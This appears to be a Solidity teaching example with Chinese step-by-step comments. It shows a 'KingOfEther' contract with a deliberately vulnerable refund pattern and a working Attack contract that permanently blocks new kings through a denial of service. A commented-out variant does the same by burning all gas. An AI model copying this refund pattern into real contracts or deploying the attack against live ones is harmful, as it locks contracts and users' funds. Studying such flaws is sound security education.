// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. 部署KingOfEther 
2. Alice通过发送 1 个以太币来成为国王。 
2. Bob 通过发送 2 个以太币到 claimThrone（） 成为国王。 Alice 收到 1 个以太币的退款。 
3. 使用KingOfEther的地址部署Attack。 
4. 用 3 个以太币调用攻击。 
5. 现任国王是Attack 合约，没有人可以成为新的国王。  

发生了什么事？ 
Attack成为King。所有新挑战都将被拒绝，因为Attack合约没有fallback 函数，拒绝接受在新国王确定之前从KingOfEther发送的以太币。
*/

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent,) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
